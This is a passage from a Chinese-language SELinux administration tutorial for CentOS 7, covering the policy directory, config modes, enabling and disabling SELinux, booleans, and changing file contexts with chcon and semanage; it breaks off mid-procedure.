<h4 id="3-4-5-策略目录介绍"><a href="#3-4-5-策略目录介绍" class="headerlink" title="3.4.5 策略目录介绍"></a>3.4.5 策略目录介绍</h4><p>SELinux 系统上安装的每个策略在 <code>/etc/selinux/</code> 目录下都有他们自己的目录，子目录的名字对应于策略的名字（如本小节介绍的 <code>Targeted Policy</code>），在 SELinux 配置文件中就要使用这些子目录名字，高速内核在启动时载入什么策略。看下 CentOS7 上 <code>/etc/selinux/</code> 目录中内容：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">➜ ls <span class="_">-l</span>Z /etc/selinux </div><div class="line">-rw-r--r--. root root system_u:object_r:selinux_config_t:s0 config</div><div class="line">-rw-r--r--. root root system_u:object_r:selinux_config_t:s0 semanage.conf</div><div class="line">drwxr-xr-x. root root system_u:object_r:selinux_config_t:s0 targeted</div></pre></td></tr></table></figure></p>
<p>上面结果显示，CentOS7 系统默认只安装了一个策略：<strong>targeted</strong> 。注意目录和策略子目录的<strong>类型</strong>都是 <code>selinux_config_t</code>。</p>
<p><code>semodule</code> 和 <code>semanage</code> 命令管理策略的诸多方面，前者管理可载入策略模块的安装、更新和删除，它对可载入策略包起作用，包括一个可载入策略模块和文件上下文消息；后者管理添加、修改和删除用户、角色文件上下文、MLS/MCS转换、端口标记和接口标记。</p>
<p>每个策略子目录包括的文件，以及文件如何标记必须遵守一个规范，这个规范被许多系统实用程序使用，帮助管理策略。通常，任何设计优良的策略源树都将正确安装策略文件，下面是 <code>targeted</code> 策略目录的列表输出，它就是一个典型：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">➜ ls <span class="_">-l</span>Z /etc/selinux/targeted </div><div class="line">-rw-r--r--. root root system_u:object_r:selinux_config_t:s0 booleans.subs_dist</div><div class="line">drwxr-xr-x. root root system_u:object_r:default_context_t:s0 contexts</div><div class="line">drwxr-xr-x. root root system_u:object_r:selinux_login_config_t:s0 logins</div><div class="line">drwxr-xr-x. root root system_u:object_r:selinux_config_t:s0 modules</div><div class="line">drwxr-xr-x. root root system_u:object_r:semanage_store_t:s0 policy</div><div class="line">-rw-r--r--. root root system_u:object_r:selinux_config_t:s0 setrans.conf</div><div class="line">-rw-r--r--. root root unconfined_u:object_r:selinux_config_t:s0 seusers</div></pre></td></tr></table></figure></p>
<h2 id="6-SELinux-配置文件及启用-禁用"><a href="#6-SELinux-配置文件及启用-禁用" class="headerlink" title="6. SELinux 配置文件及启用/禁用"></a>6. SELinux 配置文件及启用/禁用</h2><h3 id="6-1-配置文件"><a href="#6-1-配置文件" class="headerlink" title="6.1 配置文件"></a>6.1 配置文件</h3><p>SELinux 的主配置文件是 <code>/etc/selinux/config</code> 文件，它控制系统<strong>下一次启动</strong>过程中载入哪个策略。以及 SELinux 以什么样的模式运行。下面显示了一个 <code>config</code> 文件的内容：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">➜ cat /etc/selinux/config </div><div class="line"></div><div class="line"><span class="comment"># This file controls the state of SELinux on the system.</span></div><div class="line"><span class="comment"># SELINUX= can take one of these three values:</span></div><div class="line"><span class="comment">#     enforcing - SELinux security policy is enforced.</span></div><div class="line"><span class="comment">#     permissive - SELinux prints warnings instead of enforcing.</span></div><div class="line"><span class="comment">#     disabled - No SELinux policy is loaded.</span></div><div class="line">SELINUX=enforcing</div><div class="line"><span class="comment"># SELINUXTYPE= can take one of these two values:</span></div><div class="line"><span class="comment">#     targeted - Targeted processes are protected,</span></div><div class="line"><span class="comment">#     minimum - Modification of targeted policy. Only selected processes are protected. </span></div><div class="line"><span class="comment">#     mls - Multi Level Security protection.</span></div><div class="line">SELINUXTYPE=targeted</div></pre></td></tr></table></figure></p>
<p>该配置文件主要控制两个方面的设置：SELinux 的 <strong>运行模式</strong> 和 <strong>活动策略</strong>。</p>
<ul>
<li><p>SELinux 模式（由上面 <code>SELINUX=enforcing</code> 一行确定）：可以被设置为 <code>enforcing</code>/<code>permissive</code>/<code>disabled</code> 共3种。</p>
<ul>
<li><strong><code>enforcing</code></strong> 模式，在该模式下，SELinux 策略背完政治性，这是 SELinux 主要工作模式要使 SELinux 发挥增强系统安全的作用，必须开启此模式；</li>
<li><strong><code>permissive</code></strong>模式，该模式下，SELinux 的策略规则不会被强制执行，相反，只是<strong>审核并记录</strong>遭受拒绝的消息，除此之外，SELinux 对系统的安全性没有影响，此模式在调试 SELinux 策略时很有帮助；</li>
<li><strong><code>disabled</code></strong>模式，内核中的 SELinux 机制完全关闭，只有系统启动时策略载入前系统才会处于 <code>disabled</code> 模式，该模式和 <code>permissive</code> 模式有所不同，<code>permissive</code> 模式有 SELinux 内合特征操作，但不会拒绝任何访问，只是进行审核、记录；在 <code>disabled</code> 模式下， SELinux 将不会有任何动作，只有在不希望使用 SELinux 时才使用该模式。<blockquote>
<p><strong>NOTE</strong>:<br>在 <code>enforcing</code> 模式和 <code>permissive</code> 模式或者 <code>disabled</code> 模式之间切换要小心，当返回 <code>enforcing</code> 模式时，通常会导致文件标记不一致。SELinux 配置文件中的模式设置由 <code>init</code> 进程使用，在它载入初始策略前配置 SELinux 使用。</p>
</blockquote>
</li>
</ul>
</li>
<li><p>SELinux 活动策略：SELinux 配置文件中的 <code>SELINUXTYPE</code> 配置项告诉 <code>init</code> 进程在系统启动过程中载入哪个 SELinux 策略，这里设置的字符串必须匹配用来存储二进制策略版本的目录名，例如，我们使用 <code>targeted</code> 策略为例，因此设置 <code>SELINUXTYPE=targeted</code>。</p>
</li>
</ul>
<h3 id="6-2-启用-禁用-SELinux"><a href="#6-2-启用-禁用-SELinux" class="headerlink" title="6.2 启用/禁用 SELinux"></a>6.2 启用/禁用 SELinux</h3><p>启用/禁用 SELinux步骤很简单，只需修改其配置文件，然后重启系统即可。</p>
<p><strong>启用 SELinux</strong></p>
<ol>
<li><p>编辑配置文件 <code>/etc/selinux/config</code> 。根据前面对配置文件的介绍，编辑确定 SELinux 的运行模式（<strong>enforcing</strong>）和活动策略（<strong>targeted</strong>）：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># This file controls the state of SELinux on the system.</span></div><div class="line"><span class="comment"># SELINUX= can take one of these three values:</span></div><div class="line"><span class="comment">#     enforcing - SELinux security policy is enforced.</span></div><div class="line"><span class="comment">#     permissive - SELinux prints warnings instead of enforcing.</span></div><div class="line"><span class="comment">#     disabled - No SELinux policy is loaded.</span></div><div class="line">SELINUX=enforcing</div><div class="line"><span class="comment"># SELINUXTYPE= can take one of these two values:</span></div><div class="line"><span class="comment">#     targeted - Targeted processes are protected,</span></div><div class="line"><span class="comment">#     minimum - Modification of targeted policy. Only selected processes are protected. </span></div><div class="line"><span class="comment">#     mls - Multi Level Security protection.</span></div><div class="line">SELINUXTYPE=targeted</div></pre></td></tr></table></figure>
</li>
<li><p>重启系统：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">shutdown -r now</div></pre></td></tr></table></figure>
</li>
</ol>
<p><strong>禁用 SELinux</strong></p>
<ol>
<li><p>编辑配置文件 <code>/etc/selinux/config</code> 。根据前面对配置文件的介绍，编辑 SELinux 的运行模式（<strong>disabled</strong>）：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># This file controls the state of SELinux on the system.</span></div><div class="line"><span class="comment"># SELINUX= can take one of these three values:</span></div><div class="line"><span class="comment">#     enforcing - SELinux security policy is enforced.</span></div><div class="line"><span class="comment">#     permissive - SELinux prints warnings instead of enforcing.</span></div><div class="line"><span class="comment">#     disabled - No SELinux policy is loaded.</span></div><div class="line">SELINUX=disabled</div><div class="line"><span class="comment"># SELINUXTYPE= can take one of these two values:</span></div><div class="line"><span class="comment">#     targeted - Targeted processes are protected,</span></div><div class="line"><span class="comment">#     minimum - Modification of targeted policy. Only selected processes are protected. </span></div><div class="line"><span class="comment">#     mls - Multi Level Security protection.</span></div><div class="line">SELINUXTYPE=targeted</div></pre></td></tr></table></figure>
</li>
<li><p>重启系统：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">shutdown -r now</div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="7-SELinux-布尔值（Booleans）"><a href="#7-SELinux-布尔值（Booleans）" class="headerlink" title="7. SELinux 布尔值（Booleans）"></a>7. SELinux 布尔值（Booleans）</h2><hr>
<p>SELinux 中的布尔值<strong>允许 SELinux 在运行状态下动态调整部分策略</strong>，而无需重新加载 SELinux 或 重新编译 SELinux 策略，比如 允许某些服务访问 NFS 卷。</p>
<h3 id="7-1-查看-SELinux-布尔值"><a href="#7-1-查看-SELinux-布尔值" class="headerlink" title="7.1 查看 SELinux 布尔值"></a>7.1 查看 SELinux 布尔值</h3><p>以 <code>root</code> 用户身份，运行 <code>semanage boolean -l</code> 命令，即可查看包括 <strong>关闭(off)</strong> 和 <strong>打开(on)</strong> 状态的所有布尔变量，下面是部分布尔值列表：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">➜ semanage boolean <span class="_">-l</span> | wc <span class="_">-l</span></div><div class="line">282</div><div class="line">➜</div><div class="line">➜ semanage boolean <span class="_">-l</span> | more </div><div class="line">SELinux 布尔值                 状态 默认 描述</div><div class="line"></div><div class="line">ftp_home_dir                   (关,关)  Allow ftp to home dir</div><div class="line">smartmon_3ware                 (关,关)  Allow smartmon to 3ware</div><div class="line">mpd_enable_homedirs            (关,关)  Allow mpd to <span class="built_in">enable</span> homedirs</div><div class="line">xdm_sysadm_login               (关,关)  Allow xdm to sysadm login</div><div class="line">xen_use_nfs                    (关,关)  Allow xen to use nfs</div><div class="line">mozilla_read_content           (关,关)  Allow mozilla to <span class="built_in">read</span> content</div><div class="line">ssh_chroot_rw_homedirs         (关,关)  Allow ssh to chroot rw homedirs</div><div class="line">mount_anyfile                  (开,开)  Allow mount to anyfile</div><div class="line">icecast_use_any_tcp_ports      (关,关)  Allow icecast to use any tcp ports</div><div class="line">openvpn_can_network_connect    (关,关)  Allow openvpn to can network connect</div><div class="line">zoneminder_anon_write          (关,关)  Allow zoneminder to anon write</div><div class="line">telepathy_connect_all_ports    (关,关)  Allow telepathy to connect all ports</div><div class="line">spamassassin_can_network       (关,关)  Allow spamassassin to can network</div><div class="line">gluster_anon_write             (关,关)  Allow gluster to anon write</div><div class="line">deny_ptrace                    (关,关)  Allow deny to ptrace</div><div class="line">selinuxuser_execmod            (开,开)  Allow selinuxuser to execmod</div><div class="line">httpd_can_network_relay        (关,关)  Allow httpd to can network relay</div><div class="line">openvpn_enable_homedirs        (开,开)  Allow openvpn to <span class="built_in">enable</span> homedirs</div><div class="line">gpg_agent_env_file             (关,关)  Allow gpg to agent env file</div></pre></td></tr></table></figure></p>
<p>上面三列内容的意义：</p>
<ul>
<li><strong>SELinux 布尔值</strong> 列出了 SELinux 布尔值的名称；</li>
<li><strong>状态 默认</strong> 一对数据列出了对应布尔值当前的开关状态与默认状态；</li>
<li><strong>描述</strong> 列出了布尔值的用途。</li>
</ul>
<p>比如第一行的 <code>ftp_home_dir</code> 当前状态和默认状态都是 <strong>关(off)</strong> ，这条策略组织 FTP 服务的守护进程（比如 <code>vsftpd</code>）读/写 用户主目录里的文件。</p>
<p><code>getsebool -a</code> 命令会简要列出 SELinux 布尔值及其 <strong>当前状态</strong>（默认安字典序） ，而无其他信息，下面是部分结果：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">➜ getsebool <span class="_">-a</span></div><div class="line">abrt_anon_write --&gt; off</div><div class="line">abrt_handle_event --&gt; off</div><div class="line">abrt_upload_watch_anon_write --&gt; on</div><div class="line">antivirus_can_scan_system --&gt; off</div><div class="line">antivirus_use_jit --&gt; off</div><div class="line">auditadm_exec_content --&gt; on</div><div class="line">authlogin_nsswitch_use_ldap --&gt; off</div><div class="line">authlogin_radius --&gt; off</div><div class="line">authlogin_yubikey --&gt; off</div><div class="line">awstats_purge_apache_log_files --&gt; off</div><div class="line">boinc_execmem --&gt; on</div><div class="line">cdrecord_read_content --&gt; off</div><div class="line">cluster_can_network_connect --&gt; off</div><div class="line">cluster_manage_all_files --&gt; off</div><div class="line">cluster_use_execmem --&gt; off</div><div class="line">cobbler_anon_write --&gt; off</div><div class="line">cobbler_can_network_connect --&gt; off</div><div class="line">cobbler_use_cifs --&gt; off</div><div class="line">cobbler_use_nfs --&gt; off</div></pre></td></tr></table></figure></p>
<p>而运行 <code>getsebool [boolean-name]</code> 命令则会列出<strong>指定布尔值</strong>的当前状态：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜ getsebool cvs_read_shadow</div><div class="line">cvs_read_shadow --&gt; off</div></pre></td></tr></table></figure></p>
<p>上面例子中，还可以用 <strong>空格</strong> 隔开多个布尔值名称，用以一次查看多个布尔值变量的状态：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">➜ getsebool cvs_read_shadow daemons_dump_core ftp_home_dir</div><div class="line">cvs_read_shadow --&gt; off</div><div class="line">daemons_dump_core --&gt; off</div><div class="line">ftp_home_dir --&gt; off</div></pre></td></tr></table></figure></p>
<h3 id="7-2-配置布尔值"><a href="#7-2-配置布尔值" class="headerlink" title="7.2 配置布尔值"></a>7.2 配置布尔值</h3><p>以 <code>root</code> 用户身份运行 <code>setsebool [boolean_name] [on|off]</code> 命令就可以将指定的布尔值状态修改成 <strong>关闭</strong> 或 <strong>打开</strong>。下面用一个实例演示如何用此命令调整布尔值 <code>httpd_can_network_connect_db</code> 的状态。</p>
<ol>
<li><p>布尔值 <code>httpd_can_network_connect_db</code> 用以 允许/阻止 HTTP 服务器访问数据库服务，默认状态为 <code>off</code>：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜ getsebool httpd_can_network_connect_db</div><div class="line">httpd_can_network_connect_db --&gt; off</div></pre></td></tr></table></figure>
</li>
<li><p>下面的命令可以 <strong>临时允许</strong> HTTP 服务器中的脚本或模块访问数据库服务器：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">➜ setsebool httpd_can_network_connect_db on</div><div class="line">➜</div><div class="line">➜ getsebool httpd_can_network_connect_db   </div><div class="line">httpd_can_network_connect_db --&gt; on</div></pre></td></tr></table></figure>
</li>
</ol>
<p>即可发现状态修改成功。</p>
<ol>
<li>需要注意的是上述修改知识 <strong>临时</strong> 的，重启系统即会失效，若要 <strong>永久</strong> 修改某个布尔值的状态，需要对 <code>setsebool</code> 命令加 <code>-P</code> 参数：<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">➜ setsebool -P httpd_can_network_connect_db on</div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="8-SELinux-上下文修改与恢复"><a href="#8-SELinux-上下文修改与恢复" class="headerlink" title="8. SELinux 上下文修改与恢复"></a>8. SELinux 上下文修改与恢复</h2><p>在前文『3.4.2 限制进程』与『3.4.3 非限制进程』两个小节的例子中，曾经使用过 <code>chcon</code> 命令来修改文件的<strong>类型</strong>，用 <code>restorecon</code> 命令来<strong>恢复</strong>文件的<strong>类型</strong>，本小节再多介绍一下其用法。</p>
<h3 id="8-1-临时修改上下文"><a href="#8-1-临时修改上下文" class="headerlink" title="8.1 临时修改上下文"></a>8.1 临时修改上下文</h3><p><code>chcon</code> 命令可以修改文件的 SELinux 上下文，但其功能不止能修改前文例子中的<strong>类型</strong>，<strong>类型</strong>只是 SELinux 上下文的 4 个主要元素（<code>user:role:type:level</code>）之一，而该命令可以修改任何一个元素。先看其 <strong>Usage</strong>：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">➜ chcon --help</div><div class="line">用法:  chcon [选项]... 环境 文件...</div><div class="line">　或:  chcon [选项]... [-u 用户] [-r 角色] [<span class="_">-l</span> 范围] [-t 类型] 文件...</div><div class="line">　或:  chcon [选项]... --reference=参考文件 文件...</div><div class="line">Change the SELinux security context of each FILE to CONTEXT.</div><div class="line">With --reference, change the security context of each FILE to that of RFILE.</div><div class="line"></div><div class="line">Mandatory arguments to long options are mandatory <span class="keyword">for</span> short options too.</div><div class="line">      --dereference      affect the referent of each symbolic link (this is</div><div class="line">                         the default), rather than the symbolic link itself</div><div class="line">  -h, --no-dereference   affect symbolic links instead of any referenced file</div><div class="line">  -u, --user=USER        <span class="built_in">set</span> user USER <span class="keyword">in</span> the target security context</div><div class="line">  -r, --role=ROLE        <span class="built_in">set</span> role ROLE <span class="keyword">in</span> the target security context</div><div class="line">  -t, --type=TYPE        <span class="built_in">set</span> <span class="built_in">type</span> TYPE <span class="keyword">in</span> the target security context</div><div class="line">  <span class="_">-l</span>, --range=RANGE      <span class="built_in">set</span> range RANGE <span class="keyword">in</span> the target security context</div><div class="line">      --no-preserve-root  <span class="keyword">do</span> not treat <span class="string">'/'</span> specially (the default)</div><div class="line">      --preserve-root    fail to operate recursively on <span class="string">'/'</span></div><div class="line">      --reference=RFILE  use RFILE<span class="string">'s security context rather than specifying</span></div><div class="line">                         a CONTEXT value</div><div class="line">  -R, --recursive        operate on files and directories recursively</div><div class="line">  -v, --verbose          output a diagnostic for every file processed</div><div class="line"></div><div class="line">The following options modify how a hierarchy is traversed when the -R</div><div class="line">option is also specified.  If more than one is specified, only the final</div><div class="line">one takes effect.</div><div class="line"></div><div class="line">  -H                     if a command line argument is a symbolic link</div><div class="line">                         to a directory, traverse it</div><div class="line">  -L                     traverse every symbolic link to a directory</div><div class="line">                         encountered</div><div class="line">  -P                     do not traverse any symbolic links (default)</div><div class="line"></div><div class="line">      --help        显示此帮助信息并退出</div><div class="line">      --version     显示版本信息并退出</div><div class="line"></div><div class="line">GNU coreutils online help: &lt;http://www.gnu.org/software/coreutils/&gt;</div><div class="line">请向&lt;http://translationproject.org/team/zh_CN.html&gt; 报告chcon 的翻译错误</div><div class="line">要获取完整文档，请运行：info coreutils 'chcon invocation<span class="string">'</span></div></pre></td></tr></table></figure></p>
<p>有两个要点需要注意：</p>
<ul>
<li>根据<code>chcon</code> 命令的 <strong>Usage</strong> ，前文只用 <code>-t</code> 参数修改了指定文件的 <strong>类型</strong>，而还可以用 <code>-u</code> 参数修改文件的 <strong>SELinux user</strong>，用 <code>-r</code> 参数修改指定文件的 <strong>角色</strong>，用 <code>-l</code> 参数修改文件的 <strong>level</strong>。用法雷同，此处不详述；</li>
<li>除了能修改 <strong>文件</strong> 的上下文，该命令还能修改 <strong>目录</strong> 的上下文信息，参数 <code>-R</code> 可以递归地修改目录下所有文件、子目录及子目录里的文件的上下文信息；</li>
<li><code>chcon</code> 命令对 文件/目录 上下文的修改是 <strong>临时</strong> 性的，重启系统即会失效，若要 <strong>永久</strong> 修改上下文信息，需要用 <code>semanage</code> 命令，下文详述。</li>
</ul>
<p><strong><code>restorecon</code> 命令用法单一，功能也单一，仅仅是恢复 文件/目录 的默认上下文信息。</strong></p>
<h3 id="8-2-永久修改上下文"><a href="#8-2-永久修改上下文" class="headerlink" title="8.2 永久修改上下文"></a>8.2 永久修改上下文</h3><p>如前文所述，<code>semanage</code> 命令可以 <strong>永久性</strong> 修改 文件/目录 的上下文信息。当 SELinux 使用 Targeted Policy 时，该命令修改的文件的上下文先信息存储在 <code>/etc/selinux/targeted/contexts/files/</code> 目录：</p>
<ul>
<li><code>file_contexts</code> 文件存放的是大部分文件的默认上下文信息，包括<code>semanage fcontext</code> 命令更新的文件上下文信息；</li>
<li><code>file_contexts.local</code> 文件存放的是 <code>file_contexts</code> 文件中不存在的、新增文件/目录的上下文信息。</li>
</ul>
<p>有两个工具可以访问上述两个文件：<code>setfiles</code> 和 <code>restorecon</code>。前者在文件系统重新加载的时候重新标记文件上下文；后者在恢复指定文件的上下文信息的时候读取该文件的默认上下文。由此可知，<code>semanage fcontext</code> 命令修改的文件上下文是<strong>永久性</strong>的，无论文件系统是否重新加载。至于某个 Linux 系统用户能够修改指定文件的上下文信息，则由 SELinux 的策略规则控制。</p>
<p><code>semanage</code> 命令的用法:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">➜ semanage -h</div><div class="line">usage: semanage [-h]</div><div class="line">                </div><div class="line">                &#123;import,<span class="built_in">export</span>,login,user,port,interface,module,node,fcontext,boolean,permissive,dontaudit&#125;</div><div class="line">                ...</div><div class="line"></div><div class="line">semanage is used to configure certain elements of SELinux policy with-out</div><div class="line">requiring modification to or recompilation from policy source.</div><div class="line"></div><div class="line">positional arguments:</div><div class="line">  &#123;import,<span class="built_in">export</span>,login,user,port,interface,module,node,fcontext,boolean,permissive,dontaudit&#125;</div><div class="line">    import              Output <span class="built_in">local</span> customizations</div><div class="line">    <span class="built_in">export</span>              Output <span class="built_in">local</span> customizations</div><div class="line">    login               Manage login mappings between linux users and SELinux</div><div class="line">                        confined users</div><div class="line">    user                Manage SELinux confined users (Roles and levels <span class="keyword">for</span> an</div><div class="line">                        SELinux user)</div><div class="line">    port                Manage network port <span class="built_in">type</span> definitions</div><div class="line">    interface           Manage network interface <span class="built_in">type</span> definitions</div><div class="line">    module              Manage SELinux policy modules</div><div class="line">    node                Manage network node <span class="built_in">type</span> definitions</div><div class="line">    fcontext            Manage file context mapping definitions</div><div class="line">    boolean             Manage booleans to selectively <span class="built_in">enable</span> functionality</div><div class="line">    permissive          Manage process <span class="built_in">type</span> enforcement mode</div><div class="line">    dontaudit           Disable/Enable dontaudit rules <span class="keyword">in</span> policy</div><div class="line"></div><div class="line">optional arguments:</div><div class="line">  -h, --help            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></div></pre></td></tr></table></figure></p>
<p>可以看到 <code>semanage</code> 命令下有个 子命令 <code>fcontext</code> ，可以管理文件的上下文，其 <code>Usage</code> 为：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">➜ semanage fcontext -h</div><div class="line">usage: semanage fcontext [-h] [-n] [-N] [<span class="_">-s</span> STORE] [ --add ( -t TYPE <span class="_">-f</span> FTYPE -r RANGE <span class="_">-s</span> SEUSER | <span class="_">-e</span> EQUAL ) FILE_SPEC ) | --delete ( -t TYPE <span class="_">-f</span> FTYPE | <span class="_">-e</span> EQUAL ) FILE_SPEC ) | --deleteall  | --extract  | --list -C | --modify ( -t TYPE <span class="_">-f</span> FTYPE -r RANGE <span class="_">-s</span> SEUSER | <span class="_">-e</span> EQUAL ) FILE_SPEC ) ]</div><div class="line"></div><div class="line">positional arguments:</div><div class="line">  file_spec             file_spec</div><div class="line"></div><div class="line">optional arguments:</div><div class="line">  -h, --help            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></div><div class="line">  -C, --locallist       List fcontext <span class="built_in">local</span> customizations</div><div class="line">  -n, --noheading       Do not <span class="built_in">print</span> heading when listing fcontext object</div><div class="line">                        types</div><div class="line">  -N, --noreload        Do not reload policy after commit</div><div class="line">  -S STORE, --store STORE</div><div class="line">                        Select an alternate SELinux Policy Store to manage</div><div class="line">  <span class="_">-a</span>, --add             Add a record of the fcontext object <span class="built_in">type</span></div><div class="line">  <span class="_">-d</span>, --delete          Delete a record of the fcontext object <span class="built_in">type</span></div><div class="line">  -m, --modify          Modify a record of the fcontext object <span class="built_in">type</span></div><div class="line">  <span class="_">-l</span>, --list            List records of the fcontext object <span class="built_in">type</span></div><div class="line">  -E, --extract         Extract customizable commands, <span class="keyword">for</span> use within a</div><div class="line">                        transaction</div><div class="line">  -D, --deleteall       Remove all fcontext objects <span class="built_in">local</span> customizations</div><div class="line">  <span class="_">-e</span> EQUAL, --equal EQUAL</div><div class="line">                        Substitute target path with sourcepath when generating</div><div class="line">                        default label. This is used with fcontext. Requires</div><div class="line">                        <span class="built_in">source</span> and target path arguments. The context labeling</div><div class="line">                        <span class="keyword">for</span> the target subtree is made equivalent to that</div><div class="line">                        defined <span class="keyword">for</span> the source.</div><div class="line">  <span class="_">-f</span> &#123;a,f,d,c,b,s,l,p&#125;, --ftype &#123;a,f,d,c,b,s,l,p&#125;</div><div class="line">                        File Type. This is used with fcontext. Requires a file</div><div class="line">                        <span class="built_in">type</span> as shown <span class="keyword">in</span> the mode field by ls, e.g. use <span class="_">-d</span> to</div><div class="line">                        match only directories or -- to match only regular</div><div class="line">                        files. The following file <span class="built_in">type</span> options can be passed:</div><div class="line">                        -- (regular file),<span class="_">-d</span> (directory),-c (character</div><div class="line">                        device), -b (block device),<span class="_">-s</span> (socket),<span class="_">-l</span> (symbolic</div><div class="line">                        link),-p (named pipe) If you <span class="keyword">do</span> not specify a file</div><div class="line">                        <span class="built_in">type</span>, the file <span class="built_in">type</span> will default to <span class="string">"all files"</span>.</div><div class="line">  <span class="_">-s</span> SEUSER, --seuser SEUSER</div><div class="line">                        SELinux user name</div><div class="line">  -t TYPE, --type TYPE  SELinux Type <span class="keyword">for</span> the object</div><div class="line">  -r RANGE, --range RANGE</div><div class="line">                        MLS/MCS Security Range (MLS/MCS Systems only) SELinux</div><div class="line">                        Range <span class="keyword">for</span> SELinux login mapping defaults to the</div><div class="line">                        SELinux user record range.</div></pre></td></tr></table></figure></p>
<p>用 <code>semanage fcontext</code> 命令永久性修改 文件/目录 的上下文，需要两个步骤：</p>
<ol>
<li><p>设定指定 文件/目录 的默认上下文（注意文件/目录的路径要用完整路径）：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">semanage fcontext <span class="_">-a</span> [options] [file|dir]</div></pre></td></tr></table></figure>
</li>
<li><p>用 <code>restorecon</code> 命令还原该文件/目录的上下文：</p>
